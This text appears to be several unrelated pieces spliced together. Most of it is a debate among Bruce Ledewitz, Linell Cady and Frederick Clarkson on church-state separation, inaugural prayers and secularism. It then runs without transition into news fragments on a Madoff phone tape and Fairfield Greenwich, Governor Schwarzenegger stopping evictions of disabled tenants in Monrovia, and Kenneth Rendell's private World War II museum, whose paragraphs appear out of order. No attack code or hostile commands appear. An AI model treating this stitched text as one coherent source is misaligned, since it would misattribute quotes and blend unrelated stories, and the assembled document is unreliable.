But it is puzzling that you say this vision never existed in the first place .
Did n’t it reflect the views of many within , say , the media , or policy circles , or the academy , in 20th - century America ?
I do n’t mean everyone thought this way , but many did , particularly among the elite ; and it shaped institutions because of it .
The question for Bruce is why not make room for a more robust presence for religion in public life generally , but remain committed to a strong separationist model when it comes to the relationship of religion and the state ?
If we move toward your proposal of allowing the government to use religious language if it has important nonreligious meanings , does n’t the religious particularity inevitably bring with it exclusionary effects too ?
Are n’t we at a moment when we have to forge ahead with further disentangling of the religion - state interface ?
Why not abandon prayers at presidential inaugurations ?
Bruce Ledewitz : First , let me echo my thanks to Religion Dispatches for hosting the continuation of this dialogue .
As for the place of religion in the public square generally , I cannot accept the bland assertion that secularists have been tolerant of private religious speech on political matters .
Candidate Barack Obama in 2006 really did tell religious believers that “ democracy demands that the religiously motivated translate their concerns ” into secular language when debating public issues .
Richard Rorty really did call religious arguments in the public square “ conversation stoppers ” and urge their exclusion .
John Rawls really did call religion a comprehensive doctrine at odds with liberal argument ( but not only religion ) .
These instances of hostility to private religious speech faded only in the face of political opposition .
And , more to our point here , why should secularists welcome private religious speech into the public square if they resolutely object to government religious speech ?
After all , the reason for the high wall of separation must be something negative about the public face of religion , that it is divisive or emotional or superstitious .
That would be true of private religious speech also .
Not only do these hostile attitudes toward religion exist among secularists , they are supported by efforts to reinforce the high wall of separation between church and state .
I had thought that the proposal of a totally secular public space was being defended in opposition to my proposal of government use of religious imagery under certain circumstances .
Now Frederick ’s reference to accepting public religious and non-religious expressions has me a little uncertain of where we differ .
But , let me respond to the question put to me .
The answer to the question of whether or not to abandon prayers at presidential inaugurations has two answers : a Constitutional one and a policy one .
In terms of the Constitution , the answer is that such prayers are desired by the majority and like any other policy in a democratic country , the desire of the voters controls unless the Constitution specifies otherwise .
The Establishment Clause was probably aimed at preventing the establishment of a particular religion of the sort that Americans were familiar with .
In contrast to that disestablishment , which was accomplished at the federal level without much controversy , America did not practice separation in the sense usually meant today .
Since America ’s public square always contained references to God and other religious images , it can be said with confidence that at least most leading figures did not see the Establishment Clause as forbidding something like the words “ under God ” in the Pledge of Allegiance or prayers at government - sponsored events .
That kind of high wall has never enjoyed majority support in any branch of the American government , including Justice O’Connor , who is cited by Frederick for her view of the separation of church and state .
The prohibition of religious tests for public office does not mean that religion was prohibited from public life .
It meant what it said : that anyone could run for , and serve , in office .
To see its limited scope , consider the ‘ no economics ’ test that we have informally because of free speech .
That is , the government may not bar socialists from running for office .
Yet , the government endorses capitalism and the voters may , and do , take economic views of candidates into account in voting .
So it is with religion .
In terms of policy , the question is why do I personally favor prayer at presidential Inaugurations ?
The answer is that I would like to see the following prayer presented on such an occasion :
We stand here on a day of national renewal and pride .
Let us remember , however , in the words of Martin Luther King Jr. that the arc of the moral universe is long , but bends toward justice .
If this country in its pursuit of wealth oppresses its poor or its neighbors , it will fall just as surely as did Babylon .
That is what we should think about today .
Now , despite its religious saturation and its old - style preaching rhythm , this prayer would not be unconstitutional no matter how secular the public square must be .
But that just shows the emptiness of the secular proposal .
For God is often a shorthand expression for sentiments just like these .
That is , the prophetic tradition .
If there were prayer police judging whether a prayer is too religious for a public occasion , that would inhibit the robust prophetic critique that America and secularism need to hear .
Religious language , images , and symbols are important antidotes to materialism , nationalism , and relativism .
I do n’t consider it an accident that at least one of the new atheists , Christopher Hitchens , supported the war in Iraq and another , Sam Harris , supports torture ( [ T ] here are extreme circumstances in which I believe that practices like waterboarding may not only be ethically justifiable , but ethically necessary . ) .
Granted , religion is not the only such antidote , and has been guilty of supporting these pathologies as well .
Nevertheless , there is a great deal of truth in our religious traditions , and I welcome their presence on public occasions as long as their messages are nonreligious as well as sectarian .
Linell Cady : Bruce rightly notes that the strict separationist model is not the original meaning of the First Amendment ’s disestablishment clause , and for that reason and his policy rationale , he wants to accommodate religious discourse in government sponsored sites , such as “ under God ” in the Pledge or prayers at presidential inaugurations .
Although I agree with him that the original interpretation was different , I reach a different conclusion about how it should be interpreted now .
I think it is important to see that one ’s policy rationale will inevitably shape one ’s judgment on how the clauses should be interpreted .
As I view American history , and our changing demographics , I welcome the growing separation between government and religion , fully recognizing that it has been a long slow process , not something achieved all at once .
When the religion clauses were originally crafted , over 95 % of the Euro - American population was Protestant , and over 90 % from the Reformed tradition .
Not very religiously diverse .
Within this shared religio- cultural context , disestablishment was interpreted in terms of nonsectarianism .
No single Christian denomination could dominate government .
But over the past centuries , the American population has grown far more diverse .
For various reasons ( including for example anti-Catholic attitudes which helped to foster a greater desire for separation , according to Philip Hamburger in The Separation of Church and State , the efforts of religious minorities , and now the growing ranks of the non-religious )
Protestant nonsectarianism is no longer viewed by many as a sufficient way to embody separation .
We are still struggling to work out what this means .
But I would argue that the fusion between Christian identity ( or its expansion into the Protestant - Catholic - Jewish mainstream ) and American identity is still something we need to disentangle .
This is necessary to ensure the equal standing of all Americans .
But it is also important to break the hold of a chauvinistic nationalism on , for example , American Christianities .
I have very little confidence that prayers sanctioned at official government events , such as inaugurations , do anything but lay a sacralizing veneer over the entire proceeding .
I do n’t think prophetic transformation of public life is going to be fostered by the recitation of a few public pieties .
I am very reluctant to move from the religious and political views of individuals , like Sam Harris and Christopher Hitchens , to broader generalizations .
We can hardly assume that atheists were more likely to accept torture or support the war in Iraq .
In fact , if I had to make a shot in the dark like this , I would say the reverse .
This suggests to me that we should be less concerned about government - sanctioned religious expression ( assuming it has a nonreligious meaning ) than in the cultivation of more humane and transformative religious visions that can foster the flourishing of life on this planet .
I think it is time for Frederick to weigh in on these questions of Constitutional interpretation and policy .
Frederick Clarkson : Thanks Linell , I do think returning to the historical and Constitutional issues is very much in order .
But first a few words on Bruce ’s variation on his original thesis , in which he claimed that there exits or existed an “ old liberal vision of a total separation of religion and politics . ”
Again , there is not now , nor has there ever been such a vision .
But I am thankful to Bruce for offering in reply , such excellent examples in support of my point , and simultaneously helping to resolve Linell ’s puzzlement about this aspect of our disagreement .
Bruce now states that he “ cannot accept the bland assertion that secularists have been tolerant of private religious speech on political matters . ”
Since neither Linell nor I have made this assertion , I am not sure what he is talking about .
But no matter .
Let ’s go right to the conclusion he draws from his examples :
“ These instances of hostility to private religious speech , ” he writes , “ faded only in the face of political opposition . ”
In other words , some people have expressed views that were so unpopular that they have never been integrated into the value system and lexicon of liberalism .
I agree .
Bruce has also surfaced some nearly hidden gems that can help us all navigate the tricky terrain of politics in religiously plural America .
“ Richard Rorty , ” Bruce reports , “ really did call religious arguments in the public square ‘ conversation stoppers ’ and urge their exclusion . ”
Rorty has a point , albeit sweepingly overstated .
Sometimes religious arguments can be conversation stoppers .
But sometimes religious arguments can also offer great insights and advance our conversations in useful ways .
I have certainly experienced both .
The simple lesson here is just because one has the right to do something does not mean that it is always the right thing to do .
As my wise old professor of Medieval Literature once advised me : “ consider your audience . ”
What we say and how we say it often depends on the people with whom we are speaking .
Religious language can be appropriate , but we should not be surprised if sometimes people may disagree .
Welcome to America .
Should some zealous secularists get a clue ?
Of course .
Should some overbearing religious people give others a break ?
You betcha .
So what else is new ?
Bruce further declares , “ Candidate Barack Obama in 2006 really did tell religious believers that ‘ democracy demands that the religiously motivated translate their concerns ’ into secular language when debating public issues . ”
While I think Obama ’s statement is very , very far from what Bruce calls “ hostility ” to religious speech — Obama is correct for the reasons I offer above regarding Rorty , and as a practical matter for effective politics and governance .
Our respective religious traditions often inform our political thoughts ; and we often draw on religious language to express them .
But when we get together with others for the task of debating public policy with an aim towards governance , we need to be able to communicate in some common terms ; not only so we can understand each other and communicate with wider publics , but because we do not use religious language in our laws and regulations , which are necessarily secular .
All this brings me back around the matter of history and the Constitution Linell raises .
Firstly , it is important to note as she does , that the principles of the Constitution took a long time to be integrated widely and deeply into our public life .
It ’s been an uneven process and we are clearly still working on it .
But I refer back to my original point :
The First Amendment was a clarification of the underlying first principles of the Constitution .
Barring religious tests for public office in Article 6 also obviously meant that there would be no religious test for citizenship .
( You ca n’t be elected to office if you are not a citizen . )
Thus the framers were clearly not solely concerned with whether or not we had official federal or state churches , but first that the right of belief resided with individual citizens .
The plumb line of this principle is clear .
When Thomas Jefferson first proposed the Virginia Statute of Religious Freedom in 1777 , he stated that this right of individual conscience must be extended to everyone , including : “ the Jew , the Mohametan , and the Hindoo . ”
Jefferson was not arguing the demographics of majority and minority religions , but first principles .
It took time to advance them , even then .
James Madison as governor of Virginia managed to push Jefferson ’s bill through the legislature in 1786 — the year before the drafting the federal Constitution , of which Madison is credited with being the principal author — as well as the principal author of the First Amendment .
Virginia had already disestablished the Anglican Church , the day after it joined the revolution in 1776 .
So there is no mistaking the meaning of formally extending religious liberty to all in the wake of disestablishment and as a famous forerunner to the Constitution itself .
With everyone suddenly equal in the eyes of the law , ( at least in theory ) this inevitably , albeit slowly , led to the disestablishment of other state churches ; as the states had no business favoring one religious group over another .
If we focus on the establishment clause or even the notion of separation of church and state without considering the context of the balancing free exercise clause — or the Constitution itself and the relevant ideas and history that led to it — we are missing the forest for the trees .
Historians Isaac Kramnick ( Cornell ) and Frank Lambert ( Purdue ) have each written important books on the underlying ideas that predate the First Amendment and help us to understand that our conversation on these matters neither begins or ends with the First Amendment .
Again , the idea of separation of church and state and the constellation of related ideas refer to the role and behavior of government , not of individuals .
These days , how we navigate matters of religion and religious speech as citizens is not usually a matter of law or the Constitution so much as figuring out how to function in a religiously plural society .
How do we know the difference , for example , between fair criticism and religious bigotry ?
How do we reconcile our diversities in ways that allow us to function together as a reasonably unified society ?
How do we achieve unity without imposing uniformity ?
Bruce is flummoxed by the seeming paradox of the question of whether secularists who oppose religious speech by government should also tolerate religious speech by individuals .
He need n’t be .
Non-religious people should oppose government religious speech for exactly the same reasons religious people do .
We expect government to be neutral in religious matters and to function as the uncompromised guarantor of our rights as individuals .
Although Bruce does not mention it in his report on our panel , ACLU attorney Vic Walczak said that the implementation of Bruce ’s proposal could lead to “ religious tyranny ” and “ theocracy ” — and I agree .
We do not need or want official theology .
The idea of government lawyers getting together to redefine God in non-religious terms is the stuff of which a chilling off - Broadway play could be made .
Perhaps a great modern anti-totalitarian novel .
As a practical matter , both religious and non-religious people should be tolerant and respectful of the views and expressions of others , if they are not already — but only up to a point .
Some people are rude , overbearing , incoherent , and even theocratic .
Others are anti-religious bigots .
Sometimes we have to deal with difficult people both in person and on larger public stages .
That said , we are regularly beset with sudden , spectacular squalls of hypocrisy and contradictions that run against the grain of our efforts to achieve high degrees of justice and equality .
For example , a lot of politicians have a seemingly uncontrollable compulsion to carve platitudinous religious graffiti into our public buildings .
( Maybe we need some kind of anti-gang taskforce to study the matter . )
I expect that we will have to continue to endure these displays of political depravity and accommodation to the religious right .
But I see no need to legitimize any of it via legislation or judicial blessing .
As for inaugural prayers : let ’s underscore that Barack Obama learned the hard way that while a prayer might not in itself be divisive in a moment of national unity , an ill - considered choice like religious right leader Rick Warren to deliver it can be a disaster .
Navigating this often uneasy sea of powerful principles and extraordinary political paradoxes requires more and different kinds of knowledge and skills than I think many people suppose .
There are no legislative or judicial fixes on the horizon .
And maybe we do n’t need any .
But I think that we can navigate by day by knowing where we stand in the bright light of history , and by night via the northern star of the first principles of the Constitution that set us on this journey together .
We have come very far , but still have a long way to go .
Linell Cady : Thanks , Frederick .
I want to let Bruce respond to your interpretation of the historical and Constitutional issues .
I do find myself still puzzled by your insistence that the liberal vision never existed .
It never fully captured the way things are on the ground , but I do think it has had far more influence in trying to create the world in its image than you give it credit for .
But it is n’t altogether clear to me what rides on this .
If Frederick is so committed to a strong separationist model , perhaps the question he should address is whether or not there should be a tax exempt status for religions .
Would it be more faithful to the original principles , as you interpret them , to eliminate this as well ?
This follows up on Bruce ’s original statement asking how separationist is your separationist vision : how consistently separationist are you willing to be .
I am sympathetic to Bruce ’s concern to foster a public philosophy that does not devolve into a narrowly individualist / materialist vision .
How do we make room for the resources of religious and secular traditions in fostering a more adequate public ethic ?
Is making room for government - sanctioned religious discourse ( when it has important nonreligious meanings ) necessary for this endeavor ?
Bruce Ledewitz : Frederick has given us a lot of words attempting to show that religious believers are not held to a double standard in terms of their permitted vocabulary in political argument .
I remain unconvinced , in part because I see secular hostility to religious motivation in the public square all the time .
In fact , Frederick himself manifests this double standard .
Deep environmentalists are never told , as Frederick admonishes religious believers , that because most people do not share their premises , they must consider their audience in order to participate in democratic debate .
It is not undemocratic for deep environmentalists to choose their own political vocabulary , but apparently it is undemocratic for believers to do so .
If religious believers think it is God ’s will to protect the environment , for example , it would not be undemocratic for believers to try to cobble together a 51 % voting majority to do that , even if solely from among other religious believers .
Theocracy is rule by clerics .
Democracy is rule by majority .
Democracy does not depend upon a secular motivation .
Incidentally , Frederick ’s defense of President Obama ’s call to believers to translate their religious concerns into nonreligious language lends support to my original Constitutional proposal .
I called for government and nonbelievers to perform this same operation of translation in reverse : when coming upon religious language like “ under God ” in the Pledge of Allegiance , to translate it into nonreligious terms .
Frederick originally responded that such translation was illegitimate and impossible , because God is God and not the objectivity of values .
But now we see that such translation is legitimate and possible for both believers and nonbelievers .
But what Linell wants to know is : what is at stake in this question of secular hostility toward religion ?
So , let me now put my exchange with Frederick in what is , for me , its proper frame .
I came to secularism late , after a lifetime of study and life in Judaism .
It was a tragedy for me to leave Judaism , and I was desperate to retain what I could .
The traditional notion of God as a supernatural being was precluded , as was any existence after death and messianism .
But there had been Jewish thinkers in the past who had rejected some , even all of these concepts ; Mordecai Kaplan for example .
( I felt these rejections had not gone all the way .
My break had to be more complete . )
But this still left a great deal of the wisdom of Judaism and , by extension , the rest of Our Religions .
I thought I could retain prayer and purpose , the inner life and the role of history , in my new secularism .
And I came to see that a lot of theology had already begun to come to grips with the secular age ; Dietrich Bonheoffer , for example , and even Rudolph Otto ’s Idea of the Holy .
Imagine my surprise , then , when I actually looked into secular thought .
Secularists , especially younger secularists with little experience of genuine religious life , seemed content with a kind of superficial materialism and relativism .
And even that materialism seemed unaware of the descent of matter into quantum indeterminism .
The only real commitment I found was opposition to religion .
That opposition to religion served to cut secularists off from looking at what serious religious thinking had been looking at .
In this context , the wall of separation between church and state , with its insistence on a public life cleansed of religious imagery , reinforces a divide I would like to see breached .
Not for the sake of religion and not for the sake of the Constitutional order , but for the sake of a secularism I see as flat and empty .
That is why secular hostility toward religion is important .
I want to see a secularism that is wide open to all sources of wisdom , including religious sources .
The situation right now is that the words “ under God , ” Ten Commandment displays , legislative prayers , and all the rest are Constitutional , but no reason for that can command a majority on the Supreme Court .
Justice Antonin Scalia would like the Court to say that these expressions are Constitutional because government may endorse a generalized religion .
Some secularists actually like that because they can then fight against it and eventually bar all such religious expression .
I want the Court to say instead that this public religious vocabulary is Constitutional because it is part of a shared tradition of meaning that transcends its particular reference .
So , such displays are both religious and more than religious .
If the Court were to affirm that proposition , it might at some point invite secularists to take another look , not at religion per se , but at what religion has taught humankind about reality .
I want to keep that kind of cultural space open .
Linell Cady : Bruce ’s reply makes clear that a lot rides on whether or not you believe , as does Bruce , that an anti-religious secularism has dominated public discourses and institutions or not , as is the case with Frederick .
With this starting point , Bruce desires to open up cultural space for greater cross-fertilization between religious and secular traditions to enable the wisdom of the former to infuse what is often the flatness of the latter .
I share Bruce ’s goal in creating a certain kind of cultural space that leads to a “ secularism that is wide open to all sources of wisdom , including religious sources . ”
But I stop short of wanting the government to be involved in endorsing or sustaining the shared religious traditions of meaning .
It seems to me that our diversity has moved too far to easily accommodate those shared religious references .
But there are other spaces , such as the academy or the media , where we need to rethink what such a more interactive cross-fertilization of religious and secular traditions means .
Frederick , how do you feel about the need to open up a cultural space for this sort of cross-fertilization across religious and secular traditions ?
Frederick Clarkson :
But let me briefly respond to your earlier query about eliminating tax exemptions for churches : that is not a view held by leading organizational advocates of separation such as Americans United for Separation of Church and State , the Interfaith Alliance , or the Baptist Joint Committee on Religious Liberty , to name a few .
That said , most people in the separationist camp would agree that there is a need for reform of the federal nonprofit tax code , including fairer enforcement .
And I while I can’t respond to everything in Bruce ’s volley , I would be remiss not to correct him on my alleged double standard when it comes to public expression .
Religion , unlike “ deep environmentalism ” occupies a distinct , and endlessly controversial place in our history , whereas “ deep environment , ” whatever its merits , does not .
But if “ deep environmentalists ” came around spouting incomprehensible jargon ; or divisive rhetoric that had been in the lexicon of the “ deep environmentalist ” equivalent of pogroms , inquisitions , religious wars , gay bashing , or the assassination of abortion providers , I would have no problem pointing that out , and I expect that Bruce would join me in either case .
Meanwhile , regarding actual public hostility to religious expression :
It happens , and I have a very public record of confronting it , particularly its more bigoted forms .
But hostility to religious expression is not now , nor has it ever been , a tenet of liberalism ; and Bruce has no more evidence than those who have made similar claims in recent years .
Meanwhile , I think that there are lots of ways for religious and nonreligious folks to share useful perspectives .
There have been a number of such initiatives in recent years .
For example , the Clergy Letter Project annually organizes Evolution Weekend in which sermons are preached and events held in thousands of religious congregations across the country .
The National Academy of Sciences came out with a paper a few years ago that underscored the compatibility of faith and science ; and the National Center for Science Education has staff theologian to help religious and secular groups figure out how that can be so .
These are all part of the ongoing project of figuring out how to get along in a religiously plural society .
So I say , by all means , let ’s find even more cultural space for such endeavors .
Finally , regarding Bruce ’s proposal as restated : I still think he makes the classic antidemocratic error in seeking to commandeer the government , in this case the Supreme Court , to advance his particular religious ideas .
I hope he eventually hears what Vic Walczak and I have been trying to tell him : Spiritually inclined atheists are just going have to evangelize non-spiritually inclined atheists without the help of the government .
" You know , they ask you a zillion different questions and we look at them sometimes and we laugh , and we say , are you guys writing a book ? " he said .
Madoff makes the comments in a conversation with two officials of the Fairfield Greenwich Group , Madoff 's largest feeder fund , who were about to be questioned by investigators about their firm 's relationship with Madoff .
" These guys work for five years at the commission , then they become a compliance manager for a hedge fund now , " Madoff says of SEC staffers .
CNBC obtained the audio tape from the Massachusetts Secretary of State 's office under the Massachusetts public records law .
On Tuesday , Fairfield Greenwich agreed to pay $ 8 million to settle a complaint by the Secretary of State that it misrepresented its relationship with Madoff to investors .
The firm did not admit nor deny guilt .
After the tape 's release , Fairfield Greenwich issued a statement aimed at what it calls " misinterpretations " of the Madoff phone call .
" Any implication that the Madoff call affected Fairfield 's responses to the SEC is demonstrably false , " the statement says .
The statement notes that the firm asked for the SEC 's permission to speak with Madoff , then told the agency about the call afterward .
The firm says that proves its executives " completely ignored " Madoff 's much - quoted line about the conversation never having taken place .
" Rather than take Madoff 's suggestion to conceal the call , Fairfield Greenwich executives did the opposite , " the statement says .
Disabled residents of a Monrovia apartment complex who were issued lease termination notices will be allowed to stay in their homes , Gov. Arnold Schwarzenegger said today .
" I am here to tell all the people here that your eviction notice is being terminated , " Schwarzenegger said in the courtyard of Regency Court Apartments in front of dozens of its residents and their families who cheered and clapped .
Last month , about 20 physically or developmentally disabled tenants of Regency Court were notified that their leases were being terminated because the complex was always meant to be a senior apartment community .
Those under age 62 never should have been allowed to move in , the letter said , and would now have to leave .
Among them was Lily Hixon , who has Down syndrome and was featured in a story about the complex in Thursday 's Times .
That night , an update on Schwarzenegger 's Twitter page read , " My mother - in - law fought so that people like Lily Hixon could live independently " and linked to the Times ' story .
About an hour later , another post said that the governor had spoken to Star - Holdings , the Rockford , Ill . - based owner of the property , and that the disabled residents would be able to stay .
Schwarzenegger confirmed today that he had called the owners and property managers of Regency Court , who agreed not to pursue the lease terminations .
He said he had been inspired to make the call after reading the Times ' story and thinking about his mother - in - law , Eunice Kennedy Shriver .
Shriver , who died in August , founded the Special Olympics and was an advocate for people with disabilities .
" All of a sudden I heard [ her ] voice in my ear , " Schwarzenegger said .
" She says , ' Arnold why are you sitting around now , you just read the story , do something ! ' "
Hixon 's father , Ken , was elated after the governor 's visit .
" I 'm really happy for the tenants , " he said .
" What 's really scary is what would 've happened and what is happening in other places around California where people do n't know how to organize or get the attention of the press . "

The Natick museum is very much an extension of its creator and his passion for the subject , which he calls “ the biggest psychological drama of the 20th century . ’’
In a career that has taken him around the world , Rendell has bought , sold , and built fabulous collections of letters , literary and musical manuscripts , memorabilia , and precious artifacts .
His wife , former Boston television reporter Shirley McNerney Rendell , is also his partner in a business that has served wealthy clients ranging from Bill Gates , Queen Elizabeth , and Malcolm Forbes , to Armand Hammer , the Kennedy family , and numerous universities and museums .
Contemplating his legacy , Rendell , now 66 , is also in the conceptual stage of plans to build a larger facility that he would open to the general public .
The museum still wo n’t admit walk - ups or anyone under age 18 , however , and appointments must be scheduled by telephone or through the museum ’s website .
“ This is literally the first time I ’ve done anything about having more people coming here .
I mean , we ’ve kept this hidden ; there ’s no name on it even , ’’ he said .
With the publication of his new book , “ World War II : Saving the Reality , ’’ a boxed volume that re-creates many of the museum ’s most precious items , Rendell is loosening up and expanding the hours of operation .
Admission is free but by invitation or appointment only .
The museum may be the capstone of a career that has earned Rendell international renown as a collector , dealer , and authenticator of historic artifacts , yet he has discouraged publicity for his masterpiece . . . until now .
No less an authority than Phil Reed , a former curator at Britain ’s Imperial War Museum , has said it “ simply has no equal . ’’
Within its walls , the museum houses a section of the sofa that Adolf Hitler and Eva Braun committed suicide on , silicon likenesses of the period ’s major figures outfitted in their actual uniforms , a Sherman tank , and a trove of historically significant letters and documents , including the complete plans for the invasion of Normandy and a draft of the 1938 Munich Agreement , with Hitler ’s handwritten changes .
For eight years , the Museum of World War II has been a preserve open only to a circle of Rendell acquaintances , historians , and military veterans or enthusiasts .
World War II ended 64 years ago , but it comes to life every time Kenneth Rendell turns on the lights inside a squat , nondescript building in Natick .
Amid the glitz of nearby shopping centers , the exterior is purposely plain to protect the anonymity of the place and its treasure - an evocative and jaw - dropping collection of more than 6,000 wartime artifacts Rendell has gathered over four decades .
“ History is not how you wish it had been , it ’s the way it actually was , ’’ Rendell said during a long interview in his museum office , where his desk sits amid a library - size collection of World War II documents , books , and artifacts , including the suitcase Hermann Goring brought to Spandau prison and a portrait of Winston Churchill by Dwight D. Eisenhower .
“ You had really good people and actions , and you had really bad , ’’ he said .
“ You had everything , and it involved everybody .
It was just an incredible event . ’’
The items in the collection are not the sort bought on eBay , but the acquisitions of a collector - dealer who exposed fakes ( the bogus Hitler and Jack the Ripper diaries ) and wrote the standard book on forgery detection .
Verifying the chain of custody , known in the trade as provenance , is essential .
For example , Rendell said he purchased the draft of the Munich Agreement from the son of Neville Henderson , the British ambassador who attended the proceedings and saved the document , which had been left on the table after the final version was typed up .
Henderson wrote his son a letter explaining how he came to possess it , Rendell said .
He said he bought the piece of the Hitler suicide sofa from the son of an American soldier pictured in Life magazine next to the sofa with other GIs before they cut it up for souvenirs .
Rendell designed the 10,000 - square - foot museum , meticulously laid out the chronological display , and narrates the 3 1/2 - hour audio tour .
Walls divide the floorspace into 30 subject areas , such as the rise of Nazism , Winston Churchill , Resistance , the Holocaust , Pearl Harbor , D-day , the atomic bomb , and the war trials .
Especially valuable pieces are in museum cases , but most are on the walls and floor .
Rendell ’s spare written captions describe the exhibits dispassionately , without the spin of politics or political correctness .
“ You try to be sensitive , ’’ he said .
“ We have a lot of people who come here who are veterans who glorify what they did , and that ’s just fine because it ’s not up to me to have an opinion of how they dealt with or how they deal with what happened .
But I do n’t glorify war here , and I do n’t personally see it that way at all . ’’
Rendell said he has met many veterans who , late into their lives , struggled with the memories and the trauma of war .
One was Danny Thomas of Arlington , Texas , whom Rendell met on a trip to Iwo Jima .
“ We were at the top of [ Mount ] Suribachi when I heard this guy talking , ’’ Rendell said .
“ He said he had come back hoping that he could get a few nights sleep without nightmares before he died . ’’
